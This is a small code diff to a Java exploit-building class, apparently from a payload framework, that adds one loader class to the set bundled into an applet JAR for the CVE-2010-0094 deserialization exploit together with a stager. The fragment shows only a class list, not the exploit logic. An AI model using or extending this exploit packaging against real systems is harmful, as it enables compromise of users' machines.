@@ -16,6 +16,7 @@ public class CVE_2010_0094_AppletJarBuilder {
 				javapayload.exploit.DeserializationExploit.class,
 				javapayload.exploit.DeserializationExploit.Loader.class,
 				javapayload.loader.AppletLoader.class,
+				javapayload.loader.AppletLoader.ReadyNotifier.class,
 				javapayload.stager.Stager.class,
 		};
 		ByteArrayOutputStream baos = new ByteArrayOutputStream();
